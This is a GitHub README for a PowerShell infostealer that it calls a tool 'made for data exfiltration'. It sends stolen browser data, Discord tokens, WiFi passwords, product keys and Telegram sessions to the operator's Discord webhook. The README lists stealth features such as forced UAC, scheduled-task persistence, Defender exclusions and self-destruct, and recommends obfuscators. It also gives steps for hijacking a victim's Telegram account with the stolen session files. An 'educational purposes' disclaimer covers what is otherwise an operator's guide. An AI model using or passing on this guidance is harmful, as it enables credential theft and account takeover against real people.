<p align="center">
<img src="https://i.postimg.cc/m2SSKrBt/Logo.gif", width="300", height="300">
</p>

<h1 align="center">
</h1>
<p align= "center">
  <img src="https://img.shields.io/github/languages/top/kdot227/Powershell-Token-Grabber">
   <img src="https://img.shields.io/github/stars/kdot227/Powershell-Token-Grabber.svg?color=yellow">
   <img src="https://img.shields.io/github/forks/kdot227/Powershell-Token-Grabber.svg?color=red">
   <img src="https://img.shields.io/github/issues/kdot227/Powershell-Token-Grabber.svg?color=green">
   <img src="https://img.shields.io/badge/dynamic/json?label=Visitors&query=value&url=https%3A%2F%2Fapi.countapi.xyz%2Fhit%2FKDot227%2FPowerShell-Token-Grabber">
   <br>
   <img src="https://img.shields.io/github/last-commit/kdot227/Powershell-Token-Grabber">
   <img src="https://img.shields.io/github/license/kdot227/Powershell-Token-Grabber">
    <img src="https://img.shields.io/github/repo-size/kdot227/Powershell-Token-Grabber.svg?label=Repo%20size&style=flat-square">
   <br>
</p>

# PowerShell Token Grabber 

This tool is made for data exfiltration. All information collected is sent using discord webhooks.

# Usage

- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- Replace YOUR_WEBHOOK_HERE in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.



# Want to obfuscate the code ?
Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 

# Screenshot

![Screenshot](https://user-images.githubusercontent.com/96607632/232662914-2f0ff29a-673e-4f50-8b3c-51d304f9f946.png)



#  Features
- [x] GUI Builder
- [x] Force UAC
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge etc.)
- [x] Telegram Session Stealer 
- [x] Extracts Discord Token
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] Takes Desktop Screenshot  
- [x] Get System Uptime 
- [X] Get Screen Resolution
- [x] List of Installed Applications
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] List TCP Connections and Underlying Process
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)

### Telegram-Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file KDOT.zip, inside that folder there will also be another zipped folder telegram-session.zip extract it on your PC.
Now, copy the tdata folder and paste it in the directory below:

```
%userprofile%\AppData\Roaming\Telegram Desktop
```
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
# ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)


 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
- Open a new Elevated Powershell Console and Paste the Contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
  Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- Join our server https://discord.com/invite/batch

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Powershell-Token-Grabber/blob/main/LICENSE) file for details

# Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

# Credits
- https://github.com/Purp1eW0lf
- https://github.com/KDot227
- https://github.com/Chainski


